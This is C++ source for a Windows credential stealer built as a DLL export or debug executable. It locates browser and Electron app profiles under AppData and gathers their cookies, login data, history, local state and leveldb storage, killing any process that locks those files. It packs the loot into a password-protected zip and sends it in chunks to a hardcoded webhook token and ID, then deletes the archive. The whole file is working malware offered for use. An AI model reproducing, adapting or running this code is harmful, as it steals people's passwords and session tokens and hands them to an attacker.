#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <algorithm>
#include <string>
#include <vector>
#include <functional>

#include <Windows.h>

#undef min
#undef max

#pragma comment(lib, "Shlwapi.lib")

#include "ffs/linear.h"
#include "zip/zip.h"

#include "utils.h"
#include "webhook.h"
#include "usrinfo.h"

#define WEBHOOK_TOKEN "bt1e__roeSBzyaROJ1YJhGQdtrJJ5IFEX9pgEStCBOYtCdLttyl2-fqWR31pv9PQkxfv"
#define WEBHOOK_ID 1134572478090448896

#define WEBHOOK_MAX_PACK_SIZE 20
#define WEBHOOK_TARGET_PACK_SIZE 10

#ifdef _DEBUG_EXE
#define DLL_EXPORT 
#else
#define DLL_EXPORT extern "C" __declspec(dllexport)
#endif


DLL_EXPORT int CALLBACK main()
{
    std::vector<std::string> targets = {
         HPathGetWinFld(FOLDERID_LocalAppData),
         HPathGetWinFld(FOLDERID_LocalAppDataLow),
         HPathGetWinFld(FOLDERID_RoamingAppData)
    };

    std::vector<std::string> results;
    std::string search = "blob_storage";

    for (std::string target : targets)
    {
        std::vector<std::string> tmp_results;
        SearchParallelLinear(target, search, tmp_results);

        for (const std::string& res : tmp_results)
        {
            if (HPathIsFld(HPathGetParent(res)))
            {
                results.push_back(HPathGetParent(res));
            }
        }
    }
    if (results.size() == 0)
    {
        return 1;
    }

    Webhook hook(WEBHOOK_TOKEN, WEBHOOK_ID);

    UserInfo userInfo = UserInfo();
    hook.embeds.emplace_back(userInfo.Build());


    std::string outpackn = "pack_" + HStringGetUUID('_');
    std::string outpack = HPathGetWinTmp(outpackn + ".zip");
    std::string password = HStringGetRandom(20);
    HZIP hz = CreateZip(HStringToANSI(outpack), password.c_str());
    if (hz == nullptr)
    {
        return 1;
    }

    uint32_t errorCount = 0;
    for (const std::string& userDir : results)
    {
        std::string zipfolder = "pack_" + HStringGetUUID('_');
        ZRESULT zres = ZipAddFolder(hz, HStringToANSI(zipfolder));
        if (zres != ZR_OK)
        {
            errorCount++;
            continue;
        }

        std::vector<std::string> dataFiles = {
             userDir + "Network\\Cookies",
             userDir + "History",
             userDir + "Web Data",
             userDir + "Login Data",
             userDir + "Local State",
             HPathGetParent(userDir) + "Local State"
        };

        std::vector<std::string> ldbFiles = HPathGetFiles(userDir + "Local Storage\\leveldb\\");
        ldbFiles.erase(std::remove_if(ldbFiles.begin(), ldbFiles.end(), [](const std::string& path) {
            if (path.size() >= 4)
            {
                const std::string ext = path.substr(path.size() - 4);
                return !(ext == ".ldb" || ext == ".log");
            }
            return true;
            }), ldbFiles.end());
        std::move(ldbFiles.begin(), ldbFiles.end(), std::back_inserter(dataFiles));


        dataFiles.erase(std::remove_if(dataFiles.begin(), dataFiles.end(), [](const std::string& path) {
            return !HPathIsFile(path);
            }), dataFiles.end());

        if (dataFiles.size() <= 0)
        {
            errorCount++;
            continue;
        }

        std::for_each(dataFiles.begin(), dataFiles.end(), [&hook, &hz, &zipfolder, &errorCount](const std::string& path) {
            if (!HPathCanRead(path))
            {
                std::vector<DWORD> ids = {};
                if (!HProcGetIdLockingFile(path, ids)) {
                    errorCount++;
                    return;
                }

                if (ids.size() <= 0) {
                    errorCount++;
                    return;
                }

                for (const DWORD& id : ids)
                {
                    HProcTerminate(id);
                }

                std::chrono::high_resolution_clock::time_point start = std::chrono::high_resolution_clock::now();
                std::chrono::high_resolution_clock::time_point current;
                while (!HPathCanRead(path))
                {
                    current = std::chrono::high_resolution_clock::now();
                    std::chrono::duration<long long> diff = std::chrono::duration_cast<std::chrono::seconds>(current - start);
                    if (diff.count() >= 5)
                    {
                        errorCount++;
                        return;
                    }
                    Sleep(100);
                }
            }

            ZRESULT zres = ZipAdd(hz, HStringToANSI(zipfolder + "\\" + HPathGetName(path)), HStringToANSI(path));
            if (zres != ZR_OK)
            {
                errorCount++;
            }
            });
    }

    if (hz)
    {
        CloseZip(hz);
    }

    if (!HPathIsFile(outpack))
    {
        return 1;
    }
    size_t size_mo = HPathFileSize(outpack) / 1000000;

    WebhookEmbed embedZip;
    embedZip.SetTitle("ZIP");
    embedZip.SetColor(COLOR_1);

    embedZip.fields["Errors"] = std::to_string(errorCount) + "/" + std::to_string(results.size());
    embedZip.fields["Password"] = password;
    embedZip.fields["Size"] = std::to_string(size_mo) + " Mo";

    if (size_mo >= WEBHOOK_MAX_PACK_SIZE)
    {
        embedZip.fields["Chunk Id"] = outpackn;
    }

    hook.embeds.emplace_back(embedZip);

    if (size_mo < WEBHOOK_MAX_PACK_SIZE)
    {
        hook.files.emplace_back(outpack);
        hook.Send();
    }
    else {
        hook.Send();

        std::vector<std::string> files = HChunkFile(outpack, WEBHOOK_TARGET_PACK_SIZE * 1000000);
        for (const std::string& file : files)
        {
            Webhook chunkhook(WEBHOOK_TOKEN, WEBHOOK_ID);
            chunkhook.files.emplace_back(file);
            chunkhook.Send();

            DeleteFileA(file.c_str());
        }
    }

    DeleteFileA(outpack.c_str());

    return 0;
}


#ifdef _DEBUG_EXE
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_  HINSTANCE hPrevInstance, _In_ char* pCmdLine, _In_ int nCmdShow)
{
    if (AllocConsole())
    {
        FILE* fDummy;
        
        freopen_s(&fDummy, "CONOUT$", "w", stdout);
        freopen_s(&fDummy, "CONOUT$", "w", stderr);
        freopen_s(&fDummy, "CONIN$", "r", stdin);
        
        std::cout.clear();
        std::clog.clear();
        std::cerr.clear();
        std::cin.clear();
    }
    main();
    return 0;
}
#else
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    return TRUE;
}
#endif // _DEBUG_EXE

